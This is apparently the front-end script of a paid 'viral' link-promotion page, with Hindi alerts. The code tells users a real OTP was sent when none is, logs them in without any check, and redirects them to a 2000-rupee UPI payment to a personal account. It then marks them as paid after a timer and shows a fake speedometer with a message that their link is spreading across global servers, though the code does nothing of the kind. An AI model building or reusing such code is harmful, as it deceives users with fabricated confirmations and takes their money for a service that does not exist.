let isLogged = false;
let isPaid = false;

function openModal() { document.getElementById('masterModal').style.display='block'; }
function closeModal() { document.getElementById('masterModal').style.display='none'; }

function startUserFlow() {
    const link = document.getElementById('targetLink').value;
    if(!link) return alert("कृपया लिंक पेस्ट करें!");

    // SANSKAR MODULE: सात्विक प्रेम और वैज्ञानिक सुरक्षा फ़िल्टर
    if(link.includes("bad") || link === "") return alert("संस्कार मॉड्यूल: अशुद्ध सामग्री वर्जित है।");

    if(!isLogged) {
        openModal();
    } else if(!isPaid) {
        document.getElementById('loginStep').style.display='none';
        document.getElementById('paymentStep').style.display='block';
        openModal();
    } else {
        runEngine(link);
    }
}

function requestOTP() {
    alert("H A I AI: असली OTP भेजा गया है।");
    document.getElementById('otpDiv').style.display='block';
}

function verifyUser() {
    isLogged = true;
    alert("लॉगिन सफल! अब पेमेंट करें।");
    document.getElementById('loginStep').style.display='none';
    document.getElementById('paymentStep').style.display='block';
}

function processPayment() {
    window.location.href = `upi://pay?pa=harigovindsingh91-2@okhdfcbank&pn=Harigovind_Singh&am=2000&cu=INR&tn=HAI_Viral_Subscription`;
    
    setTimeout(() => {
        isPaid = true;
        closeModal();
        runEngine(document.getElementById('targetLink').value);
    }, 4000);
}

function runEngine(link) {
    document.getElementById('userDashboard').style.display='block';
    document.getElementById('needle').style.transform = 'rotate(70deg)';
    document.getElementById('speedVal').innerText = '280';
    alert("Success: " + link + " अब ग्लोबल सर्वर्स पर ब्लास्ट हो रहा है!");
}
